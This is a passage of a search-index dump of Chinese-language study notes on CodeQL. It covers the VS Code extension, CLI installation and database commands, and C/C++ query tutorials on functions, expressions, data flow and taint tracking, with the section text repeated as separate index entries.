CodeQL will look for the dependencies in all the open workspace folders, or on the user\u2019s search path. Choosing a database \u00b6 \u5173\u4e8e\u5982\u4f55\u521b\u5efa\u6d4b\u8bd5\u76ee\u6807\u7684database\uff0c\u770b CodeQL Cli \u6253\u5f00vscode\uff0c\u9009\u62e9CodeQL\u6269\u5c55\uff0c\u53ef\u4ee5\u770b\u5230 DATABASES \u548c QUERY HISTORY \uff0c\u5e76\u4e14DATABASES\u6709\u4e00\u4e2a + \u7b26\u53f7\uff0c\u70b9\u51fb\u5e76\u9009\u62e9database Run a query \u00b6 vscode \u6253\u5f00 *.ql \u53f3\u952e CodeQL: Run Query \u4e09 CodeQL CLI \u00b6 \u524d\u4e00\u8282\u7684vscode\u7684\u5927\u90e8\u5206\u5de5\u4f5c\u6700\u540e\u90fd\u662f\u8c03\u7528CodeQL CLI\u5b8c\u6210\u7684 Setting up the CodeQL CLI \u00b6 # Download the CodeQL CLI zip package wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip # Create a new CodeQL directory, For example mkdir $HOME /codeql-home # Obtain a local copy of the CodeQL queries, For example git clone https://github.com/Semmle/ql $HOME /codeql-home/codeql-repo git clone https://github.com/github/codeql-go/ $HOME /codeql-home/codeql-go-repo # Extract the zip archive unzip codeql.zip mv codeql $HOME /codeql-home/codeql-cli # validate $HOME /codeql-home/codeql-cli/codeql resolve languages # outputs ## cpp (/home/pwd/codeql-home/codeql-cli/cpp) ## go (/home/pwd/codeql-home/codeql-cli/go) ## ... ## python (/home/pwd/codeql-home/codeql-cli/python) $HOME /codeql-home/codeql-cli/codeql resolve qlpacks # outputs ## codeql-cpp (/home/pwd/codeql-home/codeql-repo/cpp/ql/src) ## codeql-cpp-tests (/home/pwd/codeql-home/codeql-repo/cpp/ql/test) ## ... ## legacy-upgrades (/home/pwd/codeql-home/codeql-cli/legacy-upgrades) Create a database \u00b6 codeql database create <database> --language = <language-identifier> \u5fc5\u987b\u6307\u5b9a <database> : \u65b0\u5efa\u6570\u636e\u5e93\u7684\u8def\u5f84\uff0c\u4e0d\u80fd\u662f\u4e00\u4e2a\u5df2\u6709\u7684\u6587\u4ef6\u5939 --language : \u4e3a\u5176\u521b\u5efa\u6570\u636e\u5e93\u7684\u8bed\u8a00\u7684\u6807\u8bc6\u7b26, codeql resolve languages \u67e5\u770b\u652f\u6301\u7684\u8bed\u8a00 \u53ef\u9009 --source-root : \u6570\u636e\u5e93\u521b\u5efa\u4e2d\u4f7f\u7528\u7684\u4e3b\u8981\u6e90\u6587\u4ef6\u7684\u6839\u6587\u4ef6\u5939\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u5047\u8bbe\u5f53\u524d\u76ee\u5f55\u662f\u6e90\u6839\u76ee\u5f55 --command : \u7528\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u8c03\u7528\u7f16\u8bd1\u5668\u7684\u6784\u5efa\u547d\u4ee4\uff0c\u6bd4\u5982 --command='make all' \u3002\u5982\u679c\u672a\u6307\u5b9a\u8be5\u547d\u4ee4\uff0cCodeQL\u5c06\u5c1d\u8bd5\u4f7f\u7528\u5185\u7f6e\u7684autobuilder\u81ea\u52a8\u68c0\u6d4b\u6784\u5efa\u7cfb\u7edf\u3002 Running codeql database analyze \u00b6 codeql database analyze <database> <queries> --format = <format> --output = <output> \u5fc5\u987b\u6307\u5b9a <database> : database\u7684\u8def\u5f84 <queries> : \u8fd0\u884c ql\u6587\u4ef6\uff0c\u5982\u679c\u662f\u76ee\u5f55\u4f1a\u9012\u5f52\u641c\u7d22\u6267\u884c --format : \u751f\u6210\u7ed3\u679c\u7684\u6587\u4ef6\u683c\u5f0f. \u652f\u6301 csv, sarif-latest, sarifv1, sarifv2, sarifv2.1.0, graphtext, dgml. --output : \u751f\u6210\u7ed3\u679c\u5230\u76ee\u5f55 Upgrade database \u00b6 codeql database upgrade <database> Others \u00b6 \u89c1 https://help.semmle.com/codeql/codeql-cli/commands.html \u56db CodeQL for C/C++ \u00b6 Basic C/C++ query example \u00b6 \u67e5\u627e\u5197\u4f59\u7684if\u8bed\u53e5 if (error) { } \u67e5\u8be2\u8bed\u53e5 import cpp from IfStmt ifstmt, Block block where ifstmt.getThen() = block and block.getNumStmt() = 0 select ifstmt, \"This 'if' statement is redundant.\" import cpp \u5bfc\u5165C/C++\u6807\u51c6\u67e5\u8be2\u5e93 from IfStmt ifstmt, Block block \u5b9a\u4e49\u53d8\u91cf\uff0c\u8bed\u6cd5\u662f <type> <variable name> . \u8fd9\u91cc\u5b9a\u4e49\u4e86 IfStmt \u7c7b\u578b ifstmt \uff0c Block \u7c7b\u578b block where ifstmt.getThen() = block and block.getNumStmt() = 0 \u6761\u4ef6. ifstmt.getThen() = block block\u5fc5\u987b\u662fif\u8bed\u53e5\u7684\u5206\u652f\u5e76\u4e14\u8fd9\u4e2ablock\u4e2dstatements\u6570\u91cf\u4e3a0 select ifstmt, \"This 'if' statement is redundant.\" \u5b9a\u4e49\u6bcf\u4e2a\u5339\u914d\u62a5\u544a\u7684\u5185\u5bb9, \u683c\u5f0f select <program element>, \"<alert message>\" the CodeQL libraries for C/C++ \u00b6 \u5173\u4e8eC/C++\u6807\u51c6\u67e5\u8be2\u5e93 https://help.semmle.com/QL/learn-ql/cpp/introduce-libraries-cpp.html Tutorial: Function classes \u00b6 \u5bfb\u627e\u9759\u6001\u51fd\u6570 \u00b6 import cpp from Function f where f.isStatic() select f, \"This is a static function.\" \u5bfb\u627e\u672a\u88ab\u8c03\u7528\u7684\u51fd\u6570 \u00b6 from Function f where not exists (FunctionCall fc | fc.getTarget() = f) select f, \"This function is never called.\" \u6392\u9664\u4f7f\u7528\u51fd\u6570\u6307\u9488\u5f15\u7528\u7684\u51fd\u6570 \u00b6 import cpp from Function f where not exists (FunctionCall fc | fc.getTarget() = f) and not exists (FunctionAccess fa | fa.getTarget() = f) select f, \"This function is never called, or referenced with a function pointer.\" \u5bfb\u627e\u7279\u5b9a\u51fd\u6570 \u00b6 import cpp from FunctionCall fc where fc.getTarget().getQualifiedName() = \"sprintf\" and not fc.getArgument( 1 ) instanceof StringLiteral select fc, \"sprintf called with variable format string.\" Tutorial: Expressions, types and statements \u00b6 Stmt - C/C++ statements Loop WhileStmt ForStmt DoStmt ConditionalStmt IfStmt SwitchStmt TryStmt ExprStmt - expressions used as a statement; for example, an assignment Block - { } blocks containing more statements \u67e5\u627e\u8d4b\u503c\u4e3a0\u7684\u8868\u8fbe\u5f0f \u00b6 import cpp from AssignExpr e where e.getRValue().getValue().toInt() = 0 select e, \"Assigning the value 0 to something.\" \u67e5\u627e\u8d4b\u503c0\u7ed9IntegralType\u53d8\u91cf\u7684\u8868\u8fbe\u5f0f \u00b6 \u6ce8\u610f Type.getUnspecifiedType() . \u5b83\u4f1a\u628a typedef \u5c55\u5f00\u6210\u5e95\u5c42\u7c7b\u578b import cpp from AssignExpr e where e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnspecifiedType() instanceof IntegralType select e, \"Assigning the value 0 to an integer.\" \u5728'for'\u5faa\u73af\u521d\u59cb\u5316\u4e2d\u67e5\u627e\u8d4b\u503c\u4e3a0 \u00b6 \u7531\u4e8e for \u7684\u521d\u59cb\u5316\u901a\u5e38\u662f\u4e00\u4e2a Stmt \u800c\u4e0d\u662f Expr , \u4f7f\u7528 getEnclosingStmt \u83b7\u53d6Expr\u6700\u63a5\u8fd1\u7684Smt\uff08\u7c7b AssignExpr \u88ab\u7c7b ExprStmt \u5c01\u88c5\uff09 import cpp from AssignExpr e, ForStmt f // the assignment is in the 'for' loop initialization statement where e.getEnclosingStmt() = f.getInitialization() and e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnspecifiedType() instanceof IntegralType select e, \"Assigning the value 0 to an integer, inside a for loop initialization.\" \u5728'for'\u5faa\u73af\u7684\u5faa\u73af\u4f53\u4e2d\u67e5\u627e\u8d4b\u503c\u4e3a0 \u00b6 * \u8868\u793a0\u6b21\u6216\u591a\u6b21\uff0c\u5373\u8fd9\u4e2a Stmt \u672c\u8eab\uff0c\u5b83\u7684 \u7236Stmt\uff0c\u7236Stmt\u7684\u7236Stmt \u7b49\u7b49 import cpp from AssignExpr e, ForStmt f // the assignment is in the for loop body where e.getEnclosingStmt().getParentStmt * () = f.getStmt() and e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnderlyingType() instanceof IntegralType select e, \"Assigning the value 0 to an integer, inside a for loop body.\" Tutorial: Conversions and classes \u00b6 Conversions, \u6240\u6709\u8f6c\u6362\u90fd\u4f1a\u66f4\u6539\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\u3002\u5b83\u4eec\u53ef\u4ee5\u662f\u9690\u5f0f\u8f6c\u6362(\u7531\u7f16\u8bd1\u5668\u751f\u6210)\uff0c\u4e5f\u53ef\u4ee5\u662f\u663e\u5f0f\u8f6c\u6362(\u7531\u7528\u6237\u8bf7\u6c42)\u3002 Expr Conversion Cast CStyleCast StaticCast ConstCastReinterpretCast DynamicCast ArrayToPointerConversion VirtualMemberToFunctionPointerConversion Classes Type UserType\u2014includes classes, typedefs, and enums Class\u2014a class or struct Struct\u2014a struct, which is treated as a subtype of Class TemplateClass\u2014a C++ class template Tutorial: Analyzing data flow in C/C++ \u00b6 Local data flow \u00b6 \u5355\u4e2a\u51fd\u6570\u5185\u90e8\u7684\u6570\u636e\u6d41\u3002\u5728 DataFlow \u6a21\u5757\u4e2d\u5b9a\u4e49\u4e86\u7c7b Node , \u8868\u793a\u6570\u636e\u53ef\u4ee5\u7ecf\u8fc7\u7684\u4efb\u4f55\u5143\u7d20\u3002Node \u5206 ExprNode \u548c ParameterNode \u3002 predicates asExpr and asParameter class Node { /** Gets the expression corresponding to this node, if any. */ Expr asExpr() { ... } /** Gets the parameter corresponding to this node, if any. */ Parameter asParameter() { ... } ... } \u6216\u8005\u4f7f\u7528 predicates exprNode \u548c parameterNode /** * Gets the node corresponding to expression `e`. */ ExprNode exprNode (Expr e) { ... } /** * Gets the node corresponding to the value of parameter `p` at function entry. */ ParameterNode parameterNode (Parameter p) { ... } localFlowStep(Node nodeFrom, Node nodeTo) , \u53ef\u4ee5\u4f7f\u7528'*'\u548c'+'\u9012\u5f52\uff0c localFlow \u76f8\u5f53\u4e8e localFlowStep* \u3002\u6bd4\u5982 DataFlow :: localFlow(DataFlow :: parameterNode(source), DataFlow :: exprNode(sink)) Using local taint tracking \u00b6 \u5c40\u90e8\u6c61\u70b9\u8ddf\u8e2a\u901a\u8fc7\u5305\u542b\u975e\u4fdd\u5b58\u503c\u7684\u6d41\u6b65\u9aa4\u6269\u5c55\u4e86\u5c40\u90e8\u6570\u636e\u6d41\u3002\u4f8b\u5982\u4e0b\u9762\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0bmalloc\u7684\u53c2\u6570\u88ab\u4f1a\u88ab\u6c61\u67d3\u3002 int i = tainted_user_input(); some_big_struct * array = malloc(i * sizeof (some_big_struct)); \u672c\u5730\u6c61\u70b9\u8ddf\u8e2a\u5728\u6a21\u5757 TaintTracking \u4e2d, localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) \u610f\u5473\u7740\uff08?\uff09\u4ece\u8282\u70b9 nodeFrom \u5230\u8282\u70b9 nodeTo \u6709\u4e00\u4e2a\u7acb\u5373\u6c61\u67d3\u4f20\u9012\u8fb9\uff0c localTaint \u60f3\u5f53\u4e8e localTaintStep* TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) Using global data flow \u00b6 \u5168\u5c40\u6570\u636e\u6d41\u8ddf\u8e2a\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u6d41\uff0c\u56e0\u6b64\u6bd4\u672c\u5730\u6570\u636e\u6d41\u66f4\u5f3a\u5927\u3002\u4f46\u662f\uff0c\u5168\u5c40\u6570\u636e\u6d41\u4e0d\u5982\u672c\u5730\u6570\u636e\u6d41\u7cbe\u786e\uff0c\u800c\u4e14\u6267\u884c\u5206\u6790\u901a\u5e38\u9700\u8981\u5927\u91cf\u7684\u65f6\u95f4\u548c\u5185\u5b58\u3002 \u4f7f\u7528\u5168\u5c40\u6570\u636e\u6d41\u5e93\u6269\u5c55\u7c7b DataFlow::Configuration \uff0c\u5982\u4e0b\u6240\u793a import semmle.code.cpp.dataflow.DataFlow class MyDataFlowConfiguration extends DataFlow :: Configuration { MyDataFlowConfiguration() { this = \"MyDataFlowConfiguration\" } override predicate isSource(DataFlow :: Node source) { ... } override predicate isSink(DataFlow :: Node sink) { ... } } \u5b9a\u4e49\u4ee5\u4e0b\u914d\u7f6e isSource \u5b9a\u4e49\u6570\u636e\u53ef\u80fd\u6d41\u81ea\u4f55\u5904 isSink \u5b9a\u4e49\u6570\u636e\u53ef\u80fd\u6d41\u5411\u67d0\u5904 isBarrier \u53ef\u9009\uff0c\u9650\u5236\u6570\u636e\u6d41 isBarrierGuard \u53ef\u9009\uff0c\u9650\u5236\u6570\u636e\u6d41 isAdditionalFlowStep \u53ef\u9009\uff0c\u6dfb\u52a0\u989d\u5916\u7684\u6d41\u6b65\u9aa4 \u4f7f\u7528\u8c13\u8bcd hasFlow(DataFlow::Node source, DataFlow::Node sink) \u8fdb\u884c\u6570\u636e\u6d41\u5206\u6790: from MyDataFlowConfiguration dataflow, DataFlow::Node source , DataFlow::Node sink where dataflow.hasFlow( source , sink) select source , \"Data flow to $@.\" , sink, sink.toString() Using global taint tracking \u00b6 \u5168\u5c40\u6c61\u70b9\u8ddf\u8e2a\u4f7f\u7528\u9644\u52a0\u7684\u975e\u4fdd\u5b58\u503c\u7684\u6b65\u9aa4\u6269\u5c55\u4e86\u5168\u5c40\u6570\u636e\u6d41\u3002\u901a\u8fc7\u6269\u5c55 TaintTracking::Configuration \u7c7b\u6765\u4f7f\u7528\u5168\u5c40\u6c61\u67d3\u8ddf\u8e2a\u5e93\uff0c\u5177\u4f53\u5982\u4e0b: import semmle.code.cpp.dataflow.TaintTracking class MyTaintTrackingConfiguration extends TaintTracking :: Configuration { MyTaintTrackingConfiguration() { this = \"MyTaintTrackingConfiguration\" } override predicate isSource(DataFlow :: Node source) { ... } override predicate isSink(DataFlow :: Node sink) { ... } } Examples \u00b6 \u67e5\u627e\u6240\u6709\u4f20\u5165 fopen \u53c2\u65701 \u7684\u8868\u8fbe\u5f0f: import cpp import semmle.code.cpp.dataflow.DataFlow from Function fopen, FunctionCall fc, Expr src where fopen.hasQualifiedName( \"fopen\" ) and fc.getTarget() = fopen and DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(fc.getArgument( 0 ))) select src \u67e5\u627e\u4f20\u5165 fopen \u53c2\u65701 \u7684 publi parameter (\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u53c2\u6570\uff0c\u6bd4\u5982 main(int argc, char **argv, char **envp) \u4e2d\u7684argc\uff0c argv, envp): import cpp import semmle.code.cpp.dataflow.DataFlow from Function fopen, FunctionCall fc, Parameter p where fopen.hasQualifiedName( \"fopen\" ) and fc.getTarget() = fopen and DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(fc.getArgument( 0 ))) select p \u67e5\u627e\u5bf9\u683c\u5f0f\u5b57\u7b26\u4e32\u6ca1\u6709\u786c\u7f16\u7801\u7684\u683c\u5f0f\u5316\u51fd\u6570\u7684\u8c03\u7528\u3002 import semmle.code.cpp.dataflow.DataFlow import semmle.code.cpp.commons.Printf from FormattingFunction format, FunctionCall call , Expr formatString where call .getTarget() = format and call .getArgument(format.getFormatParameterIndex()) = formatString and not exists (DataFlow::Node source , DataFlow::Node sink | DataFlow::localFlow( source , sink) and source .asExpr() instanceof StringLiteral and sink.asExpr() = formatString ) select call , \"Argument to \" + format.getQualifiedName() + \" isn't hard-coded.\" import semmle.code.cpp.dataflow.DataFlow class EnvironmentToFileConfiguration extends DataFlow::Configuration { EnvironmentToFileConfiguration() { this = \"EnvironmentToFileConfiguration\" } override predicate isSource(DataFlow::Node source ) { exists ( Function getenv | source .asExpr().(FunctionCall).getTarget() = getenv and getenv.hasQualifiedName( \"getenv\" ) ) } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall fc | sink.asExpr() = fc.getArgument( 0 ) and fc.getTarget().hasQualifiedName( \"fopen\" ) ) } } from Expr getenv, Expr fopen, EnvironmentToFileConfiguration config where config.hasFlow(DataFlow::exprNode(getenv), DataFlow::exprNode(fopen)) select fopen, \"This 'fopen' uses data from $@.\" , getenv, \"call to 'getenv'\"","title":"CodeQL"},{"location":"module/semmle-ql/codeql/#codeql","text":"https://semmle.com/codeql","title":"CodeQL"},{"location":"module/semmle-ql/codeql/#how-does-codeql-work","text":"","title":"How does CodeQL work"},{"location":"module/semmle-ql/codeql/#create-database","text":"\u63d0\u53d6\u4ee3\u7801\u5e93\u4e2d\u6bcf\u4e2a\u6e90\u6587\u4ef6\u7684\u5355\u4e00\u5173\u7cfb\u8868\u793a \u5bf9\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u901a\u8fc7\u76d1\u89c6\u6784\u5efa\u8fc7\u7a0b\u63d0\u53d6\u3002\u6bcf\u6b21\u8c03\u7528\u7f16\u8bd1\u5668\u6765\u5904\u7406\u6e90\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u751f\u6210\u8be5\u6587\u4ef6\u7684\u526f\u672c\uff0c\u5e76\u6536\u96c6\u5173\u4e8e\u6e90\u4ee3\u7801\u7684\u6240\u6709\u76f8\u5173\u4fe1\u606f\u3002 \u5bf9\u4e8e\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u63d0\u53d6\u5668\u76f4\u63a5\u5728\u6e90\u4ee3\u7801\u4e0a\u8fd0\u884c\uff0c\u89e3\u6790\u4f9d\u8d56\u4ee5\u63d0\u4f9b\u51c6\u786e\u7684\u4ee3\u7801\u5e93\u8868\u793a\u3002 \u5bf9\u4e8e\u591a\u8bed\u8a00\u4ee3\u7801\u5e93\uff0c\u6570\u636e\u5e93\u6bcf\u6b21\u751f\u6210\u4e00\u79cd\u8bed\u8a00\u3002 \u63d0\u53d6\u4e4b\u540e\uff0c\u5206\u6790\u6240\u9700\u7684\u6240\u6709\u6570\u636e\u88ab\u5bfc\u5165\u5230\u5355\u4e2a\u76ee\u5f55\u4e2d\uff0c\u5373CodeQL\u6570\u636e\u5e93\u3002","title":"\u4e00 Create database"},{"location":"module/semmle-ql/codeql/#run-queries","text":"\u7528\u4e13\u95e8\u8bbe\u8ba1\u7684\u9762\u5411\u5bf9\u8c61\u67e5\u8be2\u8bed\u8a00--QL,\u5bf9\u6570\u636e\u5e93\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u67e5\u8be2\u3002","title":"Run queries"},{"location":"module/semmle-ql/codeql/#interpret-query-results","text":"\u5c06\u67e5\u8be2\u7ed3\u679c\u4ee5\u66f4\u53ef\u89e3\u91ca\u7684\u65b9\u5f0f\u5c55\u793a\u3002","title":"Interpret query results"},{"location":"module/semmle-ql/codeql/#codeql-for-visual-studio-code","text":"","title":"\u4e8c CodeQL for Visual Studio Code"},{"location":"module/semmle-ql/codeql/#installing-the-extension","text":"3\u79cd\u65b9\u5f0f Go to the Visual Studio Code Marketplace in your browser and click Install. In the Extensions view (Ctrl+Shift+X or Cmd+Shift+X), search for CodeQL, then select Install. Download the CodeQL VSIX file. Then, in the Extensions view, click More actions > Install from VSIX, and select the CodeQL VSIX file.","title":"Installing the extension"},{"location":"module/semmle-ql/codeql/#configuring-access-to-the-codeql-cli","text":"CodeQL\u4f7f\u7528CodeQL CLI\u6765\u7f16\u8bd1\u548c\u8fd0\u884c\u67e5\u8be2\uff0c\u7ec6\u8282\u53e6\u5916\u4ecb\u7ecd\u3002CodeQL CLI \u4e0b\u8f7d CodeQL CLI \u5728Linux/Mac\u53eb\u505a codeql \uff0c\u5728Windows\u4e2d\u53eb\u505a codeql.cmd \u9700\u8981\u5728vscode CodeQL Extension\u914d\u7f6e\u5176\u8def\u5f84\uff08codeQL.cli.executablePath\uff09","title":"Configuring access to the CodeQL CLI"},{"location":"module/semmle-ql/codeql/#setting-up-a-codeql-workspace","text":"\u4f7f\u7528CodeQL\u65f6\uff0c\u9700\u8981\u8bbf\u95ee\u6807\u51c6CodeQL\u5e93\u3002\u4e0d\u7136\u65e0\u6cd5\u67e5\u8be2\u3002\u4e24\u79cd\u65b9\u5f0f\uff1a use the \u201cstarter\u201d workspace(\u5efa\u8bae) add the CodeQL libraries and queries to an existing workspace.","title":"Setting up a CodeQL workspace"},{"location":"module/semmle-ql/codeql/#using-the-starter-workspace","text":"Clone the https://github.com/github/vscode-codeql-starter/ repository to your computer: Make sure you include the submodules, either by using git clone --recursive , or using by git submodule update --init --remote after cloning. Use git submodule update --remote regularly to keep the submodules up to date. In VS Code, use the File > Open Workspace option to open the vscode-codeql-starter.code-workspace file from your checkout of the workspace repository.","title":"Using the \u201cstarter\u201d workspace"},{"location":"module/semmle-ql/codeql/#updating-an-existing-workspace-for-codeql","text":"Dowload the CodeQL libraries Select File > Add Folder to Workspace, and choose your local checkout of the Semmle/ql repository. Create one new folder per target language, using either the New Folder or Add Folder to Workspace options, to hold custom queries and libraries. Create a qlpack.yml file in each target language folder. This tells the CodeQL CLI the target language for that folder and what its dependencies are. (The master branch of Semmle/ql already has these files.) CodeQL will look for the dependencies in all the open workspace folders, or on the user\u2019s search path.","title":"Updating an existing workspace for CodeQL"},{"location":"module/semmle-ql/codeql/#choosing-a-database","text":"\u5173\u4e8e\u5982\u4f55\u521b\u5efa\u6d4b\u8bd5\u76ee\u6807\u7684database\uff0c\u770b CodeQL Cli \u6253\u5f00vscode\uff0c\u9009\u62e9CodeQL\u6269\u5c55\uff0c\u53ef\u4ee5\u770b\u5230 DATABASES \u548c QUERY HISTORY \uff0c\u5e76\u4e14DATABASES\u6709\u4e00\u4e2a + \u7b26\u53f7\uff0c\u70b9\u51fb\u5e76\u9009\u62e9database","title":"Choosing a database"},{"location":"module/semmle-ql/codeql/#run-a-query","text":"vscode \u6253\u5f00 *.ql \u53f3\u952e CodeQL: Run Query","title":"Run a query"},{"location":"module/semmle-ql/codeql/#codeql-cli","text":"\u524d\u4e00\u8282\u7684vscode\u7684\u5927\u90e8\u5206\u5de5\u4f5c\u6700\u540e\u90fd\u662f\u8c03\u7528CodeQL CLI\u5b8c\u6210\u7684","title":"\u4e09 CodeQL CLI"},{"location":"module/semmle-ql/codeql/#setting-up-the-codeql-cli","text":"# Download the CodeQL CLI zip package wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip # Create a new CodeQL directory, For example mkdir $HOME /codeql-home # Obtain a local copy of the CodeQL queries, For example git clone https://github.com/Semmle/ql $HOME /codeql-home/codeql-repo git clone https://github.com/github/codeql-go/ $HOME /codeql-home/codeql-go-repo # Extract the zip archive unzip codeql.zip mv codeql $HOME /codeql-home/codeql-cli # validate $HOME /codeql-home/codeql-cli/codeql resolve languages # outputs ## cpp (/home/pwd/codeql-home/codeql-cli/cpp) ## go (/home/pwd/codeql-home/codeql-cli/go) ## ... ## python (/home/pwd/codeql-home/codeql-cli/python) $HOME /codeql-home/codeql-cli/codeql resolve qlpacks # outputs ## codeql-cpp (/home/pwd/codeql-home/codeql-repo/cpp/ql/src) ## codeql-cpp-tests (/home/pwd/codeql-home/codeql-repo/cpp/ql/test) ## ... ## legacy-upgrades (/home/pwd/codeql-home/codeql-cli/legacy-upgrades)","title":"Setting up the CodeQL CLI"},{"location":"module/semmle-ql/codeql/#create-a-database","text":"codeql database create <database> --language = <language-identifier> \u5fc5\u987b\u6307\u5b9a <database> : \u65b0\u5efa\u6570\u636e\u5e93\u7684\u8def\u5f84\uff0c\u4e0d\u80fd\u662f\u4e00\u4e2a\u5df2\u6709\u7684\u6587\u4ef6\u5939 --language : \u4e3a\u5176\u521b\u5efa\u6570\u636e\u5e93\u7684\u8bed\u8a00\u7684\u6807\u8bc6\u7b26, codeql resolve languages \u67e5\u770b\u652f\u6301\u7684\u8bed\u8a00 \u53ef\u9009 --source-root : \u6570\u636e\u5e93\u521b\u5efa\u4e2d\u4f7f\u7528\u7684\u4e3b\u8981\u6e90\u6587\u4ef6\u7684\u6839\u6587\u4ef6\u5939\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u5047\u8bbe\u5f53\u524d\u76ee\u5f55\u662f\u6e90\u6839\u76ee\u5f55 --command : \u7528\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u8c03\u7528\u7f16\u8bd1\u5668\u7684\u6784\u5efa\u547d\u4ee4\uff0c\u6bd4\u5982 --command='make all' \u3002\u5982\u679c\u672a\u6307\u5b9a\u8be5\u547d\u4ee4\uff0cCodeQL\u5c06\u5c1d\u8bd5\u4f7f\u7528\u5185\u7f6e\u7684autobuilder\u81ea\u52a8\u68c0\u6d4b\u6784\u5efa\u7cfb\u7edf\u3002","title":"Create a database"},{"location":"module/semmle-ql/codeql/#running-codeql-database-analyze","text":"codeql database analyze <database> <queries> --format = <format> --output = <output> \u5fc5\u987b\u6307\u5b9a <database> : database\u7684\u8def\u5f84 <queries> : \u8fd0\u884c ql\u6587\u4ef6\uff0c\u5982\u679c\u662f\u76ee\u5f55\u4f1a\u9012\u5f52\u641c\u7d22\u6267\u884c --format : \u751f\u6210\u7ed3\u679c\u7684\u6587\u4ef6\u683c\u5f0f. \u652f\u6301 csv, sarif-latest, sarifv1, sarifv2, sarifv2.1.0, graphtext, dgml. --output : \u751f\u6210\u7ed3\u679c\u5230\u76ee\u5f55","title":"Running codeql database analyze"},{"location":"module/semmle-ql/codeql/#upgrade-database","text":"codeql database upgrade <database>","title":"Upgrade database"},{"location":"module/semmle-ql/codeql/#others","text":"\u89c1 https://help.semmle.com/codeql/codeql-cli/commands.html","title":"Others"},{"location":"module/semmle-ql/codeql/#codeql-for-cc","text":"","title":"\u56db CodeQL for C/C++"},{"location":"module/semmle-ql/codeql/#basic-cc-query-example","text":"\u67e5\u627e\u5197\u4f59\u7684if\u8bed\u53e5 if (error) { } \u67e5\u8be2\u8bed\u53e5 import cpp from IfStmt ifstmt, Block block where ifstmt.getThen() = block and block.getNumStmt() = 0 select ifstmt, \"This 'if' statement is redundant.\" import cpp \u5bfc\u5165C/C++\u6807\u51c6\u67e5\u8be2\u5e93 from IfStmt ifstmt, Block block \u5b9a\u4e49\u53d8\u91cf\uff0c\u8bed\u6cd5\u662f <type> <variable name> . \u8fd9\u91cc\u5b9a\u4e49\u4e86 IfStmt \u7c7b\u578b ifstmt \uff0c Block \u7c7b\u578b block where ifstmt.getThen() = block and block.getNumStmt() = 0 \u6761\u4ef6. ifstmt.getThen() = block block\u5fc5\u987b\u662fif\u8bed\u53e5\u7684\u5206\u652f\u5e76\u4e14\u8fd9\u4e2ablock\u4e2dstatements\u6570\u91cf\u4e3a0 select ifstmt, \"This 'if' statement is redundant.\" \u5b9a\u4e49\u6bcf\u4e2a\u5339\u914d\u62a5\u544a\u7684\u5185\u5bb9, \u683c\u5f0f select <program element>, \"<alert message>\"","title":"Basic C/C++ query example"},{"location":"module/semmle-ql/codeql/#the-codeql-libraries-for-cc","text":"\u5173\u4e8eC/C++\u6807\u51c6\u67e5\u8be2\u5e93 https://help.semmle.com/QL/learn-ql/cpp/introduce-libraries-cpp.html","title":"the CodeQL libraries for C/C++"},{"location":"module/semmle-ql/codeql/#tutorial-function-classes","text":"","title":"Tutorial: Function classes"},{"location":"module/semmle-ql/codeql/#_1","text":"import cpp from Function f where f.isStatic() select f, \"This is a static function.\"","title":"\u5bfb\u627e\u9759\u6001\u51fd\u6570"},{"location":"module/semmle-ql/codeql/#_2","text":"from Function f where not exists (FunctionCall fc | fc.getTarget() = f) select f, \"This function is never called.\"","title":"\u5bfb\u627e\u672a\u88ab\u8c03\u7528\u7684\u51fd\u6570"},{"location":"module/semmle-ql/codeql/#_3","text":"import cpp from Function f where not exists (FunctionCall fc | fc.getTarget() = f) and not exists (FunctionAccess fa | fa.getTarget() = f) select f, \"This function is never called, or referenced with a function pointer.\"","title":"\u6392\u9664\u4f7f\u7528\u51fd\u6570\u6307\u9488\u5f15\u7528\u7684\u51fd\u6570"},{"location":"module/semmle-ql/codeql/#_4","text":"import cpp from FunctionCall fc where fc.getTarget().getQualifiedName() = \"sprintf\" and not fc.getArgument( 1 ) instanceof StringLiteral select fc, \"sprintf called with variable format string.\"","title":"\u5bfb\u627e\u7279\u5b9a\u51fd\u6570"},{"location":"module/semmle-ql/codeql/#tutorial-expressions-types-and-statements","text":"Stmt - C/C++ statements Loop WhileStmt ForStmt DoStmt ConditionalStmt IfStmt SwitchStmt TryStmt ExprStmt - expressions used as a statement; for example, an assignment Block - { } blocks containing more statements","title":"Tutorial: Expressions, types and statements"},{"location":"module/semmle-ql/codeql/#0","text":"import cpp from AssignExpr e where e.getRValue().getValue().toInt() = 0 select e, \"Assigning the value 0 to something.\"","title":"\u67e5\u627e\u8d4b\u503c\u4e3a0\u7684\u8868\u8fbe\u5f0f"},{"location":"module/semmle-ql/codeql/#0integraltype","text":"\u6ce8\u610f Type.getUnspecifiedType() . \u5b83\u4f1a\u628a typedef \u5c55\u5f00\u6210\u5e95\u5c42\u7c7b\u578b import cpp from AssignExpr e where e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnspecifiedType() instanceof IntegralType select e, \"Assigning the value 0 to an integer.\"","title":"\u67e5\u627e\u8d4b\u503c0\u7ed9IntegralType\u53d8\u91cf\u7684\u8868\u8fbe\u5f0f"},{"location":"module/semmle-ql/codeql/#for0","text":"\u7531\u4e8e for 